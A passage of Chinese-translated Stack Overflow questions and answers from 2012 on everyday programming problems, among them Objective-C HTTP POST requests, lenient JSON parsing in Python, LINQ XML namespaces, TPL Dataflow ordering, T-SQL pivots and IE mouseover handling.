另外，我假设您正在提交一组表单字段（模拟 HTML 表单），而不是其他一些数据格式。在 PHP 端，这些字段可作为 $_POST 集合使用。

在下面的示例中，字段和值是虚拟的。替换真实的。

```
NSString *URLEncode(NSString *s)
{
    return [s stringByAddingPercentEscapesUsingEncoding: NSUTF8StringEncoding];
} 

void SendPOST()
{
    NSMutableURLRequest *Req = [[NSMutableURLRequest alloc] initWithURL:
        [NSURL URLWithString:@"http://localhost/path/file.php"]];
    //Plug a sensible URL here

    [Req addValue: @"application/x-www-form-urlencoded"
        forHTTPHeaderField: @"Content-Type"];
    [Req setHTTPMethod: @"POST"];

    //Let's compose the POST data out of fields and values!
    NSMutableString *POSTData = [NSMutableString stringWithCapacity:1000];
    [POSTData appendString: @"Param1="];
    [POSTData appendString: URLEncode(@"Value1")];
    [POSTData appendString: @"&Param2="];
    [POSTData appendString: URLEncode(@"Value2")];

    [Req setHTTPBody: [POSTData dataUsingEncoding: NSUTF8StringEncoding]];      
    //Your encoding might vary 

    NSURLResponse *Resp;
    NSError *Err;
    NSData *d = [NSURLConnection sendSynchronousRequest:Req
        returningResponse:&Resp error:&Err];
    if([(NSHTTPURLResponse*)Resp statusCode] != 200)
        NSLog(@"We have an error: %d", [(NSHTTPURLResponse*)Resp statusCode]);
    else
    {
        NSString *s = [[NSString alloc] initWithData:d
            encoding: NSUTF8StringEncoding];
        NSLog(@"Got some data back: %@", s);
        [s release]; //Not needed if you're using ARC.
    }   
} 
```

# python - 解析包含尾随逗号的“JSON”

> ID：11052952
> 
> 赞同：4
> 
> 时间：2012-06-15T14:45:07.277
> 
> 标签：python, json, malformed

是否有任何 Python JSON 解析器可以处理尾随逗号？

（我正在使用来自外部来源的“JSON”并且无法控制它。）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-15T15:32:25.427

抓住 PyYAML。JSON 是 YAML 的子集，因此 YAML 解析器应该解析大多数 JSON。YAML 的语法允许在序列中使用尾随逗号。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2018-05-11T04:15:27.757

[json-cfg](https://pypi.org/project/json-cfg/)似乎支持允许它的 JSON 扩展。它还允许注释和不带引号的键。

```
>>> import jsoncfg
>>> jsoncfg.loads('{"key1": "{my tricky value,}", }')
OrderedDict([('key1', '{my tricky value,}')]) 
```

可以使用 [ `JSONParserParams`] 类禁用额外的选项（注释和不带引号的键）：

```
jsoncfg.loads('{"key1": "{my tricky value,}" /*nope*/}', jsoncfg.JSONParserParams(allow_comments=False, allow_unquoted_keys=False)) 
```

这无需担心允许使用整个 YAML 语法。此外，与基于正则表达式的预处理和过于简单的模块（如 jsoncomment）不同，它实现了一个完整的[标记器和解析器](https://github.com/pasztorpisti/json-cfg/blob/master/src/jsoncfg/parser.py)（适合非常规语言）以避免嵌套问题（如逗号尾随 a`]`或`}` *字符串内部*时）。

这个库是否仍然被维护是一个悬而未决的问题。它肯定可以使用更多的文档。

# objective-c - 如何访问objective-c中的当前行号？

> ID：11052957
> 
> 赞同：0
> 
> 时间：2012-06-15T14:45:35.613
> 
> 标签：objective-c

> **可能重复：**
> [如何打印出方法名称和行号并有条件地禁用 NSLog？](https://stackoverflow.com/questions/969130/how-to-print-out-the-method-name-and-line-number-and-conditionally-disable-nslog)
> [在 Objective-C 中使用宏来记录函数名和行号](https://stackoverflow.com/questions/4506870/using-macro-in-objective-c-to-log-function-name-and-line-number)

## 问题

什么预处理器指令或函数调用将帮助我识别当前正在调用什么方法，或者文件中正在执行什么行号？

## 背景

我正在尝试编写一个快速宏来寻找无限循环，我想要一些可以在不修改的情况下复制粘贴的东西，并将 NSLog 当前文件名和行号，或当前类和方法名 - 真的任何可以让我确定什么循环是无限的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T14:49:15.263

这是一小段有用的代码：

```
#define DLog(fmt, ...) NSLog((@"%s [Line %d] " fmt), __PRETTY_FUNCTION__, __LINE__, ##__VA_ARGS__); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:51:54.587

坚持使用 Xcode 内置的静态分析可能会更好。运行它将确定任何未使用的变量、死存储和最有可能的无限循环。我认为这可能比编写您自己的自定义实现做得更好，因为编译器更了解您的代码的可能用途。

# c# - 在 LINQ 中解析 xml 元素及其属性

> ID：11052958
> 
> 赞同：0
> 
> 时间：2012-06-15T14:45:37.850
> 
> 标签：c#, xml, linq

今天是我第一次接触 LINQ，所以说我是新手是轻描淡写的。所以我要做的是解析 STAT 元素的值及其属性。我的示例 XML 看起来像这样。

```
<ILS TGT="00-25-CE-94-00-05" PID="404001C5354144E4DA40E01F5000002" ORGCODE="00010019" xmlns="Mytest/v1.0">
  <STAT TIME="000000018" TYPE="SYS" FIELD="PWR_V" VAL="1196"/>
  <STAT TIME="000000018" TYPE="CAN" NID="65" FIELD="LAST_EC" VAL="EC_HEARTBEAT_TIMEOUT"/>
  <STAT TIME="000000018" TYPE="NWK" FIELD="W_RSSI" VAL="-85"/>
  <EVT TIME="0000000017" TYPE="ACC" SUBTYPE="GRANTED" CRDT="DPIN" CRED1="1212"/>
  <EVT TIME="0000000018" TYPE="ACC" SUBTYPE="GRANTED" CRDT="DPIN" CRED1="1212" CRED2="2345"/>
  <EVT TIME="0000000019" TYPE="ACC" SUBTYPE="DENIED" CRDT="OCRD" CRED1="0000DE0871"/>
  <EVT TIME="0000000020" TYPE="ACC" SUBTYPE="GRANTED" CRDT="DCRD" CRED1="0000DE0871" CRED2="2345"/>
  <EVT TIME="0000000021" TYPE="CFG" SUBTYPE="RELOCK_TIME" VAL="300"/>
  <EVT TIME="0000000022" TYPE="LOG" SUBTYPE="HB_TIMEOUT" VAL="65"/>
</ILS> 
```

因此，在此板上搜索后，我发现以下[问题](https://stackoverflow.com/questions/6077425/linq-to-xml-extracting-attributes-and-elements)回答了我的问题。但是，我应用了它，由于某种原因我根本无法得到任何结果，任何人都可以快速查看并指出我做错了什么吗？

```
public static void ParseXML(string data)
    {
        try
        {
            XDocument xDoc = XDocument.Parse(data);

            XElement root = xDoc.Root;

            Console.WriteLine("TGT: " + root.Attribute("TGT").Value + "\n");
            Console.WriteLine("PID: " + root.Attribute("PID").Value + "\n");
            Console.WriteLine("ORGCODE: " + root.Attribute("ORGCODE").Value + "\n");
            Console.WriteLine("xmlns: " + root.Attribute("xmlns").Value + "\n");

            //Everything above this line is good, I was able to get the print out.

            var eleSTAT = from node in xDoc.Descendants("STAT")
                           select new
                           {
                               attrTIME = node.Attribute("TIME").Value,
                               attrTYPE = node.Attribute("TYPE").Value,
                               attrFIELD = node.Attribute("FIELD").Value,
                               attrVAL = node.Attribute("VAL").Value,
                           };

            //When I run my code, it never got into this foreach loop, aas if eleSTAT is empty
            foreach (var s in eleSTAT)
            {
                Console.WriteLine("TIME: " + s.attrTIME + "\n");
                Console.WriteLine("TYPE: " + s.attrTYPE + "\n");
                Console.WriteLine("FIELD: " + s.attrFIELD + "\n");
                Console.WriteLine("VAL: " + s.attrVAL + "\n");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex);
        }

    } 
```

我的最后一个问题是，由于我有多个 STAT 元素，上述方法可行吗？我想让所有 4 个 STAT 元素及其属性返回给我。我认为这必须在某种类型的循环中完成？我是否正确地说我的 foreach 循环应该已经这样做了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T15:02:32.620

您必须向[Descendants](http://msdn.microsoft.com/en-us/library/bb353813.aspx)提供 XML 名称空间。

像这样更改您的代码：

```
...
XNamespace xmlns = "Mytest/v1.0";
var eleSTAT = from node in xDoc.Descendants(xmlns + "STAT")
... 
```

# ruby - dl/win32 加载错误

> ID：11052966
> 
> 赞同：2
> 
> 时间：2012-06-15T14:46:05.510
> 
> 标签：ruby, windows

我发现这个脚本可以在 Windows 中为您提供用户名，但我收到以下错误，这与用户名无关，而是与缺少的库有关，我`dl/win32`还需要该库用于其他几个脚本。如何解决这个问题？

> C:/Ruby193/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require': 无法加载此类文件 -- dl/win32 (LoadError)

```
require 'dl/win32'

def get_user_name
  api = Win32API.new(
    'advapi32.dll',
    'GetUserName',
    'PP',
    'i'
  )

  buf = "\0" * 512
  len = [512].pack('L')
  api.call(buf,len)

  buf[0..(len.unpack('L')[0])]
end

puts get_user_name 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T15:06:13.080

我不确定“dl/win32”是什么。我使用了 Win32API gem。使用它而不是 dl/win32 使您的脚本对我有用：

```
require 'Win32API' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:53:03.443

我最好的猜测是你必须跑

```
gem install dl 
```

# cakephp - 需要根据条件在 cakephp 表单验证中进行说明

> ID：11052967
> 
> 赞同：-1
> 
> 时间：2012-06-15T14:46:13.607
> 
> 标签：cakephp

我是 cakephp 新手。如果我犯了任何错误，请告诉我。提前致谢。

我有一个包含 5 个字段的表单。在这种情况下，一个表单字段需要基于另一个字段进行验证。例如，如果我选中复选框，我需要验证文本字段，否则我不想验证。为此，我确实喜欢，我首先为文本框设置了验证规则。如果未选中该复选框，我将像这样取消设置验证字段 ( `unset($this->model_name->validate['rule-name']);`)。但是，问题就在这里。默认情况下，复选框未选中，并且还设置了验证。所以，我得到了强制符号。即使认为功能运行良好，我也不希望默认使用该强制符号。必填字段应仅在表单提交并选中复选框时出现。

谁能帮我..？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-17T11:19:24.837

所以你想要一个条件验证规则？

在这种情况下，您需要编写自己的验证规则。

在这里查看 cakephp 手册

[http://book.cakephp.org/2.0/en/models/data-validation.html#adding-your-own-validation-methods](http://book.cakephp.org/2.0/en/models/data-validation.html#adding-your-own-validation-methods)

在该函数中，您可以检查传递的参数（$this->request->data）并进行相应的验证。

# objective-c - NSTextField 在大小更改时在 NSScrollView 中的错误位置

> ID：11052971
> 
> 赞同：2
> 
> 时间：2012-06-15T14:46:20.157
> 
> 标签：objective-c, cocoa, nsscrollview

我有一个简单`NSScrollView`的从 IB 创建的。我从我的 .h 文件中链接了它，该文件是`IBOutlet`：

```
IBOutlet NSScrollView *scroller; 
```

在我的 .m 中，我以编程方式插入`NSTextField`如下：

```
NSTextField *dateTextField = [[NSTextField alloc]initWithFrame:NSMakeRect(30,yPos - kBreakHeight - 15, 100, kBreakHeight)];
[dateTextField setBordered:NO];
[dateTextField setEditable:NO];
[dateTextField setBackgroundColor:[NSColor clearColor]];
[dateTextField setAlignment:NSLeftTextAlignment];
[dateTextField setFont:[NSFont fontWithName:kAppFontBold size:11]];
[dateTextField setTextColor:[NSColor colorWithCalibratedRed:33/255.0 green:33/255.0 blue:33/255.0 alpha:1]];
[dateTextField setStringValue:dateString];
[[scroller documentView] addSubview:dateTextField]; 
```

不幸的是，在我第一次吃午饭时，文本字段不在正确的位置（但 documentView 中的其他元素是的），并且只有在我调整窗口大小时位置才是正确的。

知道如何在发布时拥有正确的位置吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T15:15:51.777

我找到了解决方案，只需添加...：

```
[dateTextField setAutoresizingMask:NSViewHeightSizable | NSViewWidthSizable | NSViewMaxXMargin | NSViewMaxYMargin | NSViewMinXMargin | NSViewMinYMargin]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-17T13:13:49.597

您没有说明您的目标是哪个版本的 OS X，如果是 Lion，您是否使用自动布局或传统的弹簧和支柱。

如果您使用弹簧和支柱（自动调整大小的蒙版），那么您应该在添加之前或之后在文本字段上设置一个框架。

如果您使用自动布局，则必须在添加字段后添加适当的约束。哦，记得 在添加之前`translatesAutoresizingMaskIntoConstraints`将文本字段的属性设置为`NO`- 否则它会添加自己的约束，这会干扰您添加的约束。根据我的经验，添加自己的显式约束比依赖自动生成的约束要好得多。

这里有一些关于布局约束的好文档：

[https://developer.apple.com/library/mac/#documentation/UserExperience/Conceptual/AutolayoutPG/Articles/Introduction.html](https://developer.apple.com/library/mac/#documentation/UserExperience/Conceptual/AutolayoutPG/Articles/Introduction.html)

[http://developer.apple.com/library/mac/#releasenotes/UserExperience/RNAutomaticLayout/_index.html#//apple_ref/doc/uid/TP40010631](http://developer.apple.com/library/mac/#releasenotes/UserExperience/RNAutomaticLayout/_index.html#//apple_ref/doc/uid/TP40010631)

去年的 WWDC 会议确实有助于理解它（需要密码）：

[https://developer.apple.com/videos/wwdc/2011/?id=103](https://developer.apple.com/videos/wwdc/2011/?id=103)

# c# - 这是 TPL Dataflow 的工作吗？

> ID：11052972
> 
> 赞同：12
> 
> 时间：2012-06-15T14:46:30.650
> 
> 标签：c#, concurrency, task-parallel-library, producer-consumer, tpl-dataflow

我在不同的任务上运行了一个非常典型的生产者/消费者模型。

Task1：从二进制文件中读取批量字节[]，并为每个字节数组集合启动一个新任务。（出于内存管理目的，该操作是批处理的）。

任务 2-n：这些是工作任务，每个都对传入的字节数组集合（来自 Tasks1）进行操作，并对字节数组进行反序列化，按特定标准对其进行排序，然后存储结果对象的集合（每个字节数组反序列化为此类对象）在并发字典中。

任务 (n+1) 我选择了并发字典，因为此任务的工作是合并存储在并发字典中的那些集合，其顺序与它们源自 Task1 的顺序相同。我通过从 Task1 一直向下传递到此任务的 collectionID（它是 int 类型并为 Task1 中的每个新集合递增）来实现这一点。该任务主要检查下一个预期的 collectionID 是否已经存储在并发字典中，如果是，则将其取出，将其添加到最终队列并检查并发字典中的下一个集合。

现在，从我阅读的内容和观看的视频来看，在我看来，TPL Dataflow 可能是这种生产者/消费者模型的完美候选者。我只是似乎无法设计一个设计并因此开始，因为我从未使用过 TPL Dataflow。就吞吐量和延迟而言，这个库是否能胜任这项任务？我目前在结果集合中每秒处理 250 万字节数组和对象。TPL 数据流可以帮助简化吗？我对以下问题的答案特别感兴趣：TPL Dataflow 在生成工作任务并在工作任务完成后重新合并它们时，是否可以保留来自 Task1 的收集批次的顺序？它会优化事物吗？在剖析了整个结构之后，我觉得由于旋转和涉及太多并发集合而浪费了相当多的时间。

有什么想法、想法吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-15T17:46:02.320

**编辑：**原来我错了。`TransformBlock` *确实*以它们进入的顺序返回项目，即使它被配置为并行。因此，我原始答案中的代码完全没用，`TransformBlock`可以使用正常代替。

* * *

*原答案：*

据我所知，.Net 中只有一个并行结构支持按照它们进入的顺序返回已处理的项目：PLINQ with [`AsOrdered()`](http://msdn.microsoft.com/en-us/library/dd413357). 但在我看来，PLINQ 并不适合你想要的。

另一方面，我认为 TPL Dataflow 非常适合，但它没有一个块可以支持并行性和同时按顺序返回项目（`TransformBlock`支持它们两者，但不是同时）。幸运的是，Dataflow 块的设计考虑了可组合性，因此我们可以构建自己的块来实现这一点。

但首先，我们必须弄清楚如何对结果进行排序。像您建议的那样，使用并发字典以及一些同步机制肯定会起作用。但我认为有一个更简单的解决方案：使用`Task`s 的队列。在输出任务中，您将 a 出列`Task`，等待它完成（异步），当它完成时，您将其结果一起发送。当队列为空时，我们仍然需要一些同步，但是如果我们巧妙地选择使用哪个队列，我们​​可以免费获得。

所以，一般的想法是这样的：我们写的是一个`IPropagatorBlock`，有一些输入和一些输出。创建自定义的最简单方法`IPropagatorBlock`是创建一个处理输入的块，另一个块产生结果并将它们视为一个使用[`DataflowBlock.Encapsulate()`](http://msdn.microsoft.com/en-us/library/hh194718%28v=vs.110%29).

输入块必须以正确的顺序处理传入的项目，因此那里没有并行化。它将创建一个新的`Task`（实际上是 a [`TaskCompletionSource`](http://msdn.microsoft.com/en-us/library/dd449174.aspx)，以便我们可以设置`Task`后者的结果），将其添加到队列中，然后发送该项目进行处理，以及一些设置正确结果的方法`Task`。因为我们不需要将此块链接到任何东西，所以我们可以使用`ActionBlock`.

输出块必须`Task`从队列中取出 s，异步等待它们，然后将它们一起发送。但是由于所有块都嵌入了一个队列，并且接受委托的块具有内置的异步等待，这将非常简单：`new TransformBlock<Task<TOutput>, TOutput>(t => t)`. 该块将作为队列和输出块工作。因此，我们不必处理任何同步。

最后一块拼图实际上是并行处理项目。为此，我们可以使用另一个`ActionBlock`，这次使用`MaxDegreeOfParallelism`set。它将接受输入，处理它，并`Task`在队列中设置正确的结果。

放在一起，它可能看起来像这样：

```
public static IPropagatorBlock<TInput, TOutput>
    CreateConcurrentOrderedTransformBlock<TInput, TOutput>(
    Func<TInput, TOutput> transform)
{
    var queue = new TransformBlock<Task<TOutput>, TOutput>(t => t);

    var processor = new ActionBlock<Tuple<TInput, Action<TOutput>>>(
        tuple => tuple.Item2(transform(tuple.Item1)),
        new ExecutionDataflowBlockOptions
        {
            MaxDegreeOfParallelism = DataflowBlockOptions.Unbounded
        });

    var enqueuer = new ActionBlock<TInput>(
        async item =>
        {
            var tcs = new TaskCompletionSource<TOutput>();
            await processor.SendAsync(
                new Tuple<TInput, Action<TOutput>>(item, tcs.SetResult));
            await queue.SendAsync(tcs.Task);
        });

    enqueuer.Completion.ContinueWith(
        _ =>
        {
            queue.Complete();
            processor.Complete();
        });

    return DataflowBlock.Encapsulate(enqueuer, queue);
} 
```

经过这么多的讨论，我认为这是相当少量的代码。

看来您非常关心性能，因此您可能需要微调此代码。例如，`MaxDegreeOfParallelism`将`processor`块设置为类似的东西可能是有意义的[`Environment.ProcessorCount`](http://msdn.microsoft.com/en-us/library/system.environment.processorcount.aspx)，以避免超额订阅。此外，如果延迟对您来说比吞吐量更重要，那么将相同的块设置为 1（或另一个小数字）可能是有意义`MaxMessagesPerTask`的，这样当一个项目的处理完成时，它会立即发送到输出。

此外，如果你想限制传入的项目，你可以设置`BoundedCapacity`.`enqueuer`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-06-07T16:32:15.610

是的，[TPL 数据流](https://docs.microsoft.com/en-us/dotnet/standard/parallel-programming/dataflow-task-parallel-library)库非常适合这项工作。它支持您需要的所有功能：[`MaxDegreeOfParallelism`](https://docs.microsoft.com/en-us/dotnet/api/system.threading.tasks.dataflow.executiondataflowblockoptions.maxdegreeofparallelism)和。但是使用该选项需要注意细节。[`BoundedCapacity`](https://docs.microsoft.com/en-us/dotnet/api/system.threading.tasks.dataflow.dataflowblockoptions.boundedcapacity)[`EnsureOrdered`](https://docs.microsoft.com/en-us/dotnet/api/system.threading.tasks.dataflow.dataflowblockoptions.ensureordered)`BoundedCapacity`

首先，您必须确保使用该[`SendAsync`](https://docs.microsoft.com/en-us/dotnet/api/system.threading.tasks.dataflow.dataflowblock.sendasync)方法提供管道中的第一个块。否则，如果您使用该[`Post`](https://docs.microsoft.com/en-us/dotnet/api/system.threading.tasks.dataflow.dataflowblock.post)方法并忽略其返回值，您可能会丢失消息。永远不会丢失消息，因为它`SendAsync`会异步阻塞调用者，直到块的内部缓冲区中有传入消息的可用空间。

其次，您必须确保下游块中可能出现的异常不会无限期地阻塞馈线，等待永远不会到来的可用空间。没有内置的方法可以通过配置块来自动实现这一点。相反，您必须手动将下游块的完成传播到上游块。这是`PropagateFailure`以下示例中方法的意图：

```
public static async Task ProcessAsync(string[] filePaths,
    ConcurrentQueue<MyClass> finalQueue)
{
    var reader = new TransformBlock<string, byte[]>(filePath =>
    {
        byte[] result = ReadBinaryFile(filePath);
        return result;
    }, new ExecutionDataflowBlockOptions()
    {
        MaxDegreeOfParallelism = 1, // This is the default
        BoundedCapacity = 20, // keep memory usage under control
        EnsureOrdered = true // This is also the default
    });

    var deserializer = new TransformBlock<byte[], MyClass>(bytes =>
    {
        MyClass result = Deserialize(bytes);
        return result;
    }, new ExecutionDataflowBlockOptions()
    {
        MaxDegreeOfParallelism = Environment.ProcessorCount,
        BoundedCapacity = 20
    });

    var writer = new ActionBlock<MyClass>(obj =>
    {
        finalQueue.Enqueue(obj);
    });

    reader.LinkTo(deserializer,
        new DataflowLinkOptions() { PropagateCompletion = true });
    PropagateFailure(deserializer, reader); // Link backwards

    deserializer.LinkTo(writer,
        new DataflowLinkOptions() { PropagateCompletion = true });
    PropagateFailure(writer, deserializer); // Link backwards

    foreach (var filePath in filePaths)
    {
        var accepted = await reader.SendAsync(filePath).ConfigureAwait(false);
        if (!accepted) break; // This will happen in case that the block has failed
    }
    reader.Complete(); // This will be ignored if the block has already failed

    await writer.Completion; // This will propagate the first exception that occurred
}

public static async void PropagateFailure(IDataflowBlock block1,
    IDataflowBlock block2)
{
    try { await block1.Completion.ConfigureAwait(false); }
    catch (Exception ex) { block2.Fault(ex); }
} 
```

# c++ - 线程池发生了什么？

> ID：11052978
> 
> 赞同：3
> 
> 时间：2012-06-15T14:46:44.000
> 
> 标签：c++, multithreading, boost, c++11

有谁知道[Threadpool](http://threadpool.sourceforge.net/)发生了什么？

它似乎质量很好，虽然没有包括测试。为什么这没有被添加到 Boost 中？有人知道 C++11 端口吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:53:31.530

[Boost::Thread](http://www.boost.org/doc/html/thread/thread_management.html#thread.thread_management.threadgroup)有一个`thread_group`提供典型线程池操作的类型。在 C++11 中，使用`std::future`s 可能会自动进行一些池化。

# tsql - 如何正确分组数据

> ID：11052987
> 
> 赞同：2
> 
> 时间：2012-06-15T14:47:29.003
> 
> 标签：tsql, group-by, pivot, cube, rollup

我的最终目标是有一个看起来像这样的表：

```
Maturity Band     AAA     AA     A    A-    BBB+     BBB-    BB+    BB   Total
Less Than 1 yr    2.63%   5%                2%                           9.63%
1 to 5 yrs                       5%         5%                           10%
5 to 10 yrs       5.00%                              5%                  10%
10 to 20 yrs                          2%                                 2%
More than 20 yrs  10%                                         6%    1%   17%
Total             17.63%   5%    5%   2%    7%       5%       6%    1%   48.63% 
```

我创建的过程（@Worktable）中的表如下所示：

```
PortfolioID    IssueName    SandPRating    SandPRatingSort    MaturityBand    MaturitySort
XXXXX          Bond1        AAA            1                  Less than 1 yr  1
XXXXX          Bond2        AAA            1                  Less than 1 yr  1
XXXXX          Bond3        AA-            7                  5 to 10 yrs     3
XXXXX          Bond4        BBB+           8                  1 to 5 yrs      2
etc....... 
```

SandPRatingSort 以 1 为最高排序评级，成熟度排序也是如此。

我的问题是我正在努力在我的程序中将表格编码为上述格式（对不起，如果这看起来很容易，但我对此比较陌生）。我可以按 MaturityBand 对其进行分组，但我如何将其按正确的顺序排列，以及如何以评级作为标题来实现百分比？顺便说一下，百分比是具有评级的债券数量占投资组合持有的所有债券的百分比。

到目前为止，我得到的最好的是这个支点：

```
SELECT MaturityBand, [AAA],[AA+],[AA],[AA-],[A+],[A],[A-],[BBB+],[BBB],[BBB-],[BB+],[BB],[BB-],[B+],[B],[B-],[CCC+],[CCC],[CCC-],[CC],[C],[DDD],[DD],[D],[N.R.],[N.A.],[WR]
FROM
(
SELECT
MaturityBand
,SandPRating
FROM @Worktable
WHERE SandPRating IS NOT NULL
GROUP BY MaturityBand, SandPRating, MaturitySort, SandPSort
) AS source
PIVOT
(
COUNT(SandPRating)
FOR SandPRating IN ([AAA],[AA+],[AA],[AA-],[A+],[A],[A-],[BBB+],[BBB],[BBB-],[BB+],[BB],[BB-],[B+],[B],[B-],[CCC+],[CCC],[CCC-],[CC],[C],[DDD],[DD],[D],[N.R.],[N.A.],[WR])
) AS pvt 
```

枢轴没有做我想做的事。我如何获得百分比？我怎样才能得到列和行的总计？此外，枢轴中的计数仅返回 1，我怎样才能得到它来计算每列的评分数，而不必对工作表进行大量的返工？

对正确方向的一点或一些指导将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T10:15:58.170

通过一些试验和错误以及其他帖子的一些帮助，我设法回答了我自己的问题。CTE 非常有用，我很高兴我有这种经验能够了解它的来龙去脉。

```
;WITH CTE
AS
(
SELECT  PortfolioID
        , MaturityBand
        , SandPRating
        , MaturitySort
        , SUM((1/RecNo)*100) AS Pct

FROM    @Worktable AS A
--WHERE SandPRating IS NOT NULL
Group by MaturitySort, MaturityBand, SandPRating, PortfolioID

UNION All

SELECT   PortfolioID
        , MaturityBand
        , 'SandPRating_Total' AS SandPRating
        , MaturitySort
        , COUNT(*) * 100.0
        /
        (
            SELECT COUNT(*)
            FROM     @Worktable AS B
            WHERE B.PortfolioID = A.PortfolioID
        ) AS Total_Pct
FROM    @Worktable AS A
--WHERE SandPRating IS NOT NULL 
GROUP BY  MaturitySort, MaturityBand, PortfolioID
)
, CTE2
AS
(
SELECT  Grouping_ID(SandPRating, MaturityBand, MaturitySort) AS ID

     , CASE 
        WHEN Grouping_ID(SandPRating, MaturityBand, MaturitySort) = 3 THEN 'Total' 
        ELSE MaturityBand 
       END                                              AS MaturityBand

     , SandPRating

     , CASE 
        WHEN Grouping_ID(SandPRating, MaturityBand, MaturitySort) = 3 THEN 1000 
        ELSE MaturitySort 
       END                                              AS MaturitySort

     , SUM(Pct) AS PCT

FROM    CTE
GROUP BY ROLLUP (SandPRating
     , MaturityBand
     , MaturitySort)
)
--PIVOT
SELECT  MaturityBand, [AAA],[AA+],[AA],[AA-],[A+],[A],[A-]
    ,[BBB+],[BBB],[BBB-],[BB+],[BB],[BB-],[B+],[B],[B-]
    ,[CCC+],[CCC],[CCC-],[CC],[C],[DDD],[DD],[D],[N.R.]
    ,[N.A.],[WR],[Unass],[SandPRating_Total]     
FROM    (   SELECT SandPRating, MaturityBand, MaturitySort, PCT 
        FROM Cte2
        WHERE   ID = 0 or ID = 3
    ) AS x

PIVOT   (SUM(PCT)
        FOR SandPRating
        IN  ([AAA],[AA+],[AA],[AA-],[A+],[A],[A-]
            ,[BBB+],[BBB],[BBB-],[BB+],[BB],[BB-],[B+],[B],[B-]
            ,[CCC+],[CCC],[CCC-],[CC],[C],[DDD],[DD],[D],[N.R.]
            ,[N.A.],[WR],[Unass],[SandPRating_Total])
    ) myPiv
ORDER BY MaturitySort 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T20:04:17.860

以下获取所有总数并计算所有项目的百分比值：

```
SELECT *
FROM (
  SELECT
    MaturitySort = COALESCE(MaturitySort, 2147483647),
    MaturityBand = COALESCE(MaturityBand, 'Total'),
    SandPRating  = COALESCE(SandPRating , 'Total'),
    [Percent]    =
      COUNT(*) * 100.0 /
      SUM(CASE WHEN MaturityBand IS NOT NULL AND SandPRating IS NOT NULL THEN COUNT(*) END) OVER ()
  FROM WorkTable
  GROUP BY
  CUBE(
    (MaturityBand, MaturitySort),
    (SandPRating)
  )
) s
PIVOT (
  MAX([Percent]) FOR SandPRating IN (
    [AAA],[AA+],[AA],[AA-],[A+],[A],[A-],
    [BBB+],[BBB],[BBB-],[BB+],[BB],[BB-],[B+],[B],[B-],
    [CCC+],[CCC],[CCC-],[CC],[C],[DDD],[DD],[D],[N.R.],
    [N.A.],[WR],[Unass],[Total]
  )
) p
ORDER BY MaturitySort 
```

如您所见，百分比值的计算使用聚合窗口函数 ( `SUM()`)。如果没有分组依据`CUBE()`，我们可以这样做`SUM(COUNT(*)) OVER ()`。但`CUBE()`它会包含不应包含的值（汇总计数）。解释它们的一种方法是测试`SandPRating`和`MaturityBand`NULL，因为当行包含汇总计数时，NULL 被替换为任一列或两列。

当然，这假设任何一个列`MaturityBand`都不能保存实际的 NULL。省略汇总的更合适的方法可能是测试结果：如果它为两列都返回，则在总数中包括：`GROUPING(*column*)``0``COUNT(*)`

```
…
[Percent]    =
  COUNT(*) * 100.0 /
  SUM(CASE WHEN GROUPING(MaturityBand) = 0 AND GROUPING(SandPRating) = 0 THEN COUNT(*) END) OVER ()
… 
```

# javascript - 鼠标悬停事件不会在 IE9 上为子元素细化，事件不会在 IE8 上启动

> ID：11052988
> 
> 赞同：12
> 
> 时间：2012-06-15T14:47:38.057
> 
> 标签：javascript, html, dom, highlight

我们正在调整此处发布的方法[，在鼠标悬停时突出显示 DOM 元素，就像检查不](https://stackoverflow.com/questions/11010569/highlight-a-dom-element-on-mouse-over-like-inspect-does/11010645#11010645)使用**jQuery**一样。

到目前为止，我们提出了这个解决方案：http: [//jsfiddle.net/pentium10/Q7ZQV/3/](http://jsfiddle.net/pentium10/Q7ZQV/3/)

这似乎适用于 Chrome 和 Firefox，但在 IE 上无法正常工作。

1.  例如，在 IE9 上，突出显示不会出现在诸如标签行之类的次要元素上，例如：`javascript, html, dom`或顶行，例如：`chat, meta, faq`

    当我将鼠标悬停在 javascript 标签上时，大 div 被高亮显示，这是[错误](http://screencast.com/t/NZ9W4xre)的，它应该[就像我们在 Firefox 中看到的那样](http://screencast.com/t/MwttbVKrXr)

2.  在 IE8 和 7 上它无法启动，所以这是我们需要修复的另一个问题

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-06-17T16:00:55.870

我想我在您的实施中发现了问题。但在我们开始之前，您可能希望解决第 45 行中出现的全局范围泄漏问题。有一个分号，您可能需要一个逗号：

```
var target = e.target,
    offset = findPos(target),
    width = target.offsetWidth;//target.outerWidth(),
    height = target.offsetHeight;//target.outerHeight(); 
```

您可能还想知道[Array#indexOf](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/indexOf)自 IE9 以来受支持，因此`~no.indexOf(e.target)`在 IE8 及更低版本中会失败。

现在到你的问题。当前的浏览器（包括 Firefox）知道`pointer-events:none`. 甚至 IE10 的支持[仍然未知](http://caniuse.com/#feat=pointer-events)。任何不支持指针事件的浏览器都*不会*`mouseenter`在覆盖层覆盖的元素上触发事件。

使用 IE7+ 支持[document.elementFromPoint()](https://developer.mozilla.org/en/DOM/document.elementFromPoint)您可以绑定到`mousemove`、隐藏图层、检测光标下方的元素，并`mouseover`在必要时触发。如果您走这条路，请考虑限制您的`mousemove`事件（请参阅[limit.js](https://github.com/m-gagne/limit.js/blob/master/limit.js)）。

像[这样](http://jsfiddle.net/rodneyrehm/KzeSd/)的东西。

**更新：**

